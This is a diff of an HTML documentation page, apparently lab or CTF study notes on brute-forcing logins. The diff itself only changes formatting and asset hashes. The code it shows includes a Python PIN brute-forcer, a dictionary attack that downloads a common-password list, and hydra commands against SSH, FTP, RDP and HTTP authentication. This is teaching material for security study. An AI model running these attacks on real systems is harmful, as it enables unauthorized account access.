@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -2859,21 +2859,21 @@
 <span class="normal">17</span>
 <span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
 </span><span id="__span-0-2">
-</span><span id="__span-0-3"><span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>  <span class="c1"># Change this to your instance IP address</span>
+</span><span id="__span-0-3"><span class="n">ip</span> <span class="o">=</span> <span class="s2">"127.0.0.1"</span>  <span class="c1"># Change this to your instance IP address</span>
 </span><span id="__span-0-4"><span class="n">port</span> <span class="o">=</span> <span class="mi">1234</span>       <span class="c1"># Change this to your instance port number</span>
 </span><span id="__span-0-5">
 </span><span id="__span-0-6"><span class="c1"># Try every possible 4-digit PIN (from 0000 to 9999)</span>
 </span><span id="__span-0-7"><span class="k">for</span> <span class="n">pin</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
-</span><span id="__span-0-8">    <span class="n">formatted_pin</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">pin</span><span class="si">:</span><span class="s2">04d</span><span class="si">}</span><span class="s2">&quot;</span>  <span class="c1"># Convert the number to a 4-digit string (e.g., 7 becomes &quot;0007&quot;)</span>
-</span><span id="__span-0-9">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Attempted PIN: </span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-0-8">    <span class="n">formatted_pin</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">pin</span><span class="si">:</span><span class="s2">04d</span><span class="si">}</span><span class="s2">"</span>  <span class="c1"># Convert the number to a 4-digit string (e.g., 7 becomes "0007")</span>
+</span><span id="__span-0-9">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Attempted PIN: </span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
 </span><span id="__span-0-10">
 </span><span id="__span-0-11">    <span class="c1"># Send the request to the server</span>
-</span><span id="__span-0-12">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">/pin?pin=</span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-0-12">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">/pin?pin=</span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
 </span><span id="__span-0-13">
 </span><span id="__span-0-14">    <span class="c1"># Check if the server responds with success and the flag is found</span>
-</span><span id="__span-0-15">    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">ok</span> <span class="ow">and</span> <span class="s1">&#39;flag&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>  <span class="c1"># .ok means status code is 200 (success)</span>
-</span><span id="__span-0-16">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Correct PIN found: </span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-</span><span id="__span-0-17">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Flag: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-0-15">    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">ok</span> <span class="ow">and</span> <span class="s1">'flag'</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>  <span class="c1"># .ok means status code is 200 (success)</span>
+</span><span id="__span-0-16">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Correct PIN found: </span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="__span-0-17">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Flag: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">'flag'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
 </span><span id="__span-0-18">        <span class="k">break</span>
 </span></code></pre></div></td></tr></table></div>
 <h2 id="common-wordlists">Common Wordlists</h2>
@@ -2941,23 +2941,23 @@
 <span class="normal">19</span>
 <span class="normal">20</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
 </span><span id="__span-1-2">
-</span><span id="__span-1-3"><span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>  <span class="c1"># Change this to your instance IP address</span>
+</span><span id="__span-1-3"><span class="n">ip</span> <span class="o">=</span> <span class="s2">"127.0.0.1"</span>  <span class="c1"># Change this to your instance IP address</span>
 </span><span id="__span-1-4"><span class="n">port</span> <span class="o">=</span> <span class="mi">1234</span>       <span class="c1"># Change this to your instance port number</span>
 </span><span id="__span-1-5">
 </span><span id="__span-1-6"><span class="c1"># Download a list of common passwords from the web and split it into lines</span>
-</span><span id="__span-1-7"><span class="n">passwords</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+</span><span id="__span-1-7"><span class="n">passwords</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
 </span><span id="__span-1-8">
 </span><span id="__span-1-9"><span class="c1"># Try each password from the list</span>
 </span><span id="__span-1-10"><span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
-</span><span id="__span-1-11">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Attempted password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-1-11">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Attempted password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
 </span><span id="__span-1-12">
 </span><span id="__span-1-13">    <span class="c1"># Send a POST request to the server with the password</span>
-</span><span id="__span-1-14">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">/dictionary&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
+</span><span id="__span-1-14">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">/dictionary"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">'password'</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
 </span><span id="__span-1-15">
-</span><span id="__span-1-16">    <span class="c1"># Check if the server responds with success and contains the &#39;flag&#39;</span>
-</span><span id="__span-1-17">    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">ok</span> <span class="ow">and</span> <span class="s1">&#39;flag&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>
-</span><span id="__span-1-18">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Correct password found: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-</span><span id="__span-1-19">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Flag: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-1-16">    <span class="c1"># Check if the server responds with success and contains the 'flag'</span>
+</span><span id="__span-1-17">    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">ok</span> <span class="ow">and</span> <span class="s1">'flag'</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>
+</span><span id="__span-1-18">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Correct password found: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="__span-1-19">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Flag: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">'flag'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
 </span><span id="__span-1-20">        <span class="k">break</span>
 </span></code></pre></div></td></tr></table></div>
 <h2 id="hybrid-attacks">Hybrid Attacks</h2>
@@ -3087,10 +3087,10 @@
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span>
-<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1">hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-p<span class="w"> </span>toor<span class="w"> </span>-M<span class="w"> </span>targets.txt<span class="w"> </span>ssh<span class="w"> </span><span class="c1"># Use the username &quot;root&quot;/Use the password &quot;toor&quot;/Target all IP addresses listed in the targets.txt file/Employ the ssh module for the attack</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1">hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-p<span class="w"> </span>toor<span class="w"> </span>-M<span class="w"> </span>targets.txt<span class="w"> </span>ssh<span class="w"> </span><span class="c1"># Use the username "root"/Use the password "toor"/Target all IP addresses listed in the targets.txt file/Employ the ssh module for the attack</span>
 </span><span id="__span-2-2">hydra<span class="w"> </span>-L<span class="w"> </span>usernames.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-s<span class="w"> </span><span class="m">2121</span><span class="w"> </span>-V<span class="w"> </span>ftp.example.com<span class="w"> </span>ftp<span class="w"> </span><span class="c1"># Target the FTP service on ftp.example.com via port 2121</span>
 </span><span id="__span-2-3">hydra<span class="w"> </span>-l<span class="w"> </span>administrator<span class="w"> </span>-x<span class="w"> </span><span class="m">6</span>:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>rdp<span class="w"> </span><span class="c1"># Generate and test passwords ranging from 6 to 8 characters, using the specified character set</span>
-</span><span id="__span-2-4">hydra<span class="w"> </span>-l<span class="w"> </span>basic-auth-user<span class="w"> </span>-P<span class="w"> </span><span class="m">2023</span>-200_most_used_passwords.txt<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>http-get<span class="w"> </span>/<span class="w"> </span>-s<span class="w"> </span><span class="m">81</span><span class="w"> </span><span class="c1"># Target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path (&#39;/&#39;)</span>
+</span><span id="__span-2-4">hydra<span class="w"> </span>-l<span class="w"> </span>basic-auth-user<span class="w"> </span>-P<span class="w"> </span><span class="m">2023</span>-200_most_used_passwords.txt<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>http-get<span class="w"> </span>/<span class="w"> </span>-s<span class="w"> </span><span class="m">81</span><span class="w"> </span><span class="c1"># Target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/')</span>
 </span></code></pre></div></td></tr></table></div>
 <h3 id="medusa">Medusa</h3>
 <h4 id="medusa-parameters">Medusa Parameters</h4>
@@ -3412,7 +3412,7 @@
       <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
